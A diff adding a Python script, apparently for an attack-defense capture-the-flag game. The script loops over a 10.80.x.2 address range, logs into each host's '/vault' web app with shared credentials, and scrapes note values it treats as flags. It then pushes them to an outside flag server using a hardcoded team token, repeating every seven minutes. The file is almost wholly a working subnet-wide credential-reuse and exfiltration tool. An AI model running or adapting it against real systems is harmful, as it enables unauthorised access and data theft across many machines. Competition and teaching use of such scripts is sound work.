@@ -1,0 +1,134 @@
+import requests
+from bs4 import BeautifulSoup
+import time
+import ipaddress
+import json
+import socket
+from urllib.parse import urlparse
+
+# --- Configuration ---
+START_IP = "10.80.1.2"
+END_IP = "10.80.30.2"
+EXCLUDED_IP = "10.80.15.2"
+PORT = "8490"
+OUTPUT_FILE = "flag.txt"
+
+# Web App Authentication (From your screenshot)
+OPERATOR = "gennai"
+PASSPHRASE = "YOUR_PASSPHRASE_HERE" # Replace with actual passphrase
+
+# Flag Submission API Configuration
+TEAM_TOKEN = "3b4e0683fc88455e"
+API_URL = "http://flag.i-hack.online/flags"
+
+def submit_flag(flag_value):
+    """Submits a single flag using the raw socket method from your snippet."""
+    url = urlparse(API_URL)
+    HOST = url.hostname or "flag.i-hack.online"
+    PORT_API = url.port or (443 if url.scheme == "https" else 80)
+    
+    body = json.dumps([flag_value])
+    
+    # Corrected HTTP Request string
+    req = (
+        f"PUT {url.path or '/flags'} HTTP/1.1\r\n"
+        f"Host: {HOST}\r\n"
+        f"X-Team-Token: {TEAM_TOKEN}\r\n"
+        f"Content-Type: application/json\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        f"Connection: close\r\n\r\n"
+        f"{body}"
+    )
+
+    try:
+        with socket.create_connection((HOST, PORT_API), timeout=10) as s:
+            s.sendall(req.encode())
+            response = s.recv(4096).decode()
+            # Print only the body or relevant status line to keep logs clean
+            print(f"  [SUBMIT] Response: {response.splitlines()[-1]}")
+    except Exception as e:
+        print(f"  [SUBMIT] Error submitting {flag_value}: {e}")
+
+def extract_notes_from_ip(ip):
+    """Connects to a specific IP, logs in, and extracts the top 3 notes."""
+    url = f"http://{ip}:{PORT}/vault"
+    session = requests.Session()
+    
+    try:
+        # 1. Initial GET to establish session/cookies
+        session.get(url, timeout=5)
+        
+        # 2. Login POST
+        login_data = {
+            "operator": OPERATOR,
+            "passphrase": PASSPHRASE
+        }
+        session.post(url, data=login_data, timeout=5)
+        
+        # 3. Get the page with notes (Adjust if this requires a specific API call like /api/notes)
+        notes_response = session.get(url, timeout=5)
+        notes_response.raise_for_status()
+        
+        soup = BeautifulSoup(notes_response.text, 'html.parser')
+        table = soup.find('table') 
+        
+        if not table:
+            print(f"[{ip}] No notes table found.")
+            return []
+
+        extracted_notes = []
+        rows = table.find_all('tr')[1:] # Skip header
+        
+        for row in rows:
+            cols = row.find_all('td')
+            if len(cols) >= 4:
+                note_text = cols[3].text.strip()
+                
+                # Filter out generic text, keep the base64 looking flags
+                if note_text and "routine note" not in note_text.lower():
+                    extracted_notes.append(note_text)
+                    
+                if len(extracted_notes) >= 3:
+                    break
+                    
+        return extracted_notes
+
+    except requests.exceptions.RequestException as e:
+        print(f"[{ip}] Connection Error: {e}")
+        return []
+
+def main():
+    start_int = int(ipaddress.IPv4Address(START_IP))
+    end_int = int(ipaddress.IPv4Address(END_IP))
+    
+    while True:
+        print(f"\n=== Starting scan cycle at {time.strftime('%Y-%m-%d %H:%M:%S')} ===")
+        
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write(f"\n--- Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
+            
+            for ip_int in range(start_int, end_int + 1):
+                current_ip = str(ipaddress.IPv4Address(ip_int))
+                
+                if current_ip == EXCLUDED_IP:
+                    continue
+                    
+                print(f"[{current_ip}] Extracting notes...")
+                notes = extract_notes_from_ip(current_ip)
+                
+                if notes:
+                    f.write(f"IP: {current_ip}\n")
+                    for i, note in enumerate(notes, 1):
+                        print(f"  -> Found Note {i}: {note}")
+                        f.write(f"  Note {i}: {note}\n")
+                        
+                        # Submit the note to the flag API
+                        submit_flag(note)
+                else:
+                    print(f"  -> No valid notes found.")
+                    
+        print(f"=== Cycle complete. Sleeping for 7 minutes ===\n")
+        time.sleep(420) # 7 minutes * 60 seconds
+
+if __name__ == "__main__":
+    main()
